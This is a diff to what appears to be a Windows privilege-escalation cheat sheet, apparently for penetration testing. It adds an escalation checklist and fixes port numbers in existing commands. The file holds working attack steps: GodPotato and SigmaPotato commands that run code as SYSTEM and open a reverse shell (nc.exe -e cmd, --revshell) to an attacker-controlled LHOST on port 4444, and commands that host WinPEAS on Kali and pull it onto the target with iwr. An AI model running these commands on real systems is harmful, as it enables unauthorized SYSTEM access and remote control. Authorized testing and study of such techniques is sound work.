@@ -20,6 +20,21 @@ whoami /all
 
 Record current identity, groups and token privileges. A listed privilege alone does not prove an available escalation. [Microsoft whoami](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami).
 
+## Privilege escalation decision
+
+Match the lead to the execution path before running a tool:
+
+- [ ] Identity and groups: `whoami /all`, privileged group membership, logon rights.
+- [ ] Token privileges: SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege, SeBackupPrivilege or SeLoadDriverPrivilege.
+- [ ] Service or task path: writable binary, configuration, arguments, dependency or trigger.
+- [ ] Application configuration: web.config, database files, scripts, history and transcripts.
+- [ ] Potato path: service-account shell with impersonation rights; test PrintSpoofer, GodPotato or SigmaPotato.
+- [ ] Automated sweep: run WinPEAS only after manual checks stall or to validate one concrete lead.
+
+```cmd
+whoami /all
+```
+
 ## Impersonation escalation
 
 When `whoami /priv` shows `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` enabled — common for service accounts such as `iis apppool\defaultapppool` or `nt authority\network service` — escalate with the potato family. Upload the binary from an Evil-WinRM session, then run it on the target:
@@ -48,7 +63,7 @@ Run one command as SYSTEM, or chain a shell:
 
 ```powershell
 .\GodPotato.exe -cmd "cmd /c whoami"
-.\GodPotato.exe -cmd "cmd /c .\nc.exe {{LHOST}} {{LPORT}} -e cmd"
+.\GodPotato.exe -cmd "cmd /c .\nc.exe {{LHOST}} 4444 -e cmd"
 ```
 
 Quote the whole `-cmd` value; nested quotes break the call. [GodPotato](https://github.com/BeichenDream/GodPotato).
@@ -59,7 +74,7 @@ A current all-in-one binary; hand it a command or ask for a reverse shell:
 
 ```powershell
 .\SigmaPotato.exe "cmd /c whoami"
-.\SigmaPotato.exe --revshell {{LHOST}} {{LPORT}}
+.\SigmaPotato.exe --revshell {{LHOST}} 4444
 ```
 
 [SigmaPotato](https://github.com/tylerdotrar/SigmaPotato).
@@ -86,11 +101,11 @@ The C# build requires .NET 4.5.2 or newer. [WinPEAS requirements](https://github
 
 ### Host WinPEAS on Kali
 
-Run on Kali. Set LPORT to a free HTTP server port, such as 8000. Keep the server running.
+Run on Kali. Keep the HTTP server running on port 8000.
 
 ```bash
 cd /home/kali/tools/binaries
-python3 -m http.server {{LPORT}}
+python3 -m http.server 8000
 ```
 
 TODO: verify the local package path if that directory or winPEASx64.exe is missing.
@@ -100,7 +115,7 @@ TODO: verify the local package path if that directory or winPEASx64.exe is missi
 Run in the target's PowerShell session, in a writable directory. LHOST is Kali's IP reachable from the target's subnet.
 
 ```powershell
-iwr -UseBasicParsing -Uri 'http://{{LHOST}}:{{LPORT}}/winPEASx64.exe' -OutFile '.\winPEASx64.exe'
+iwr -UseBasicParsing -Uri 'http://{{LHOST}}:8000/winPEASx64.exe' -OutFile '.\winPEASx64.exe'
 ```
 
 This uses HTTP for the file transfer, including from an existing Evil-WinRM shell. [PowerShell download options](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-5.1).
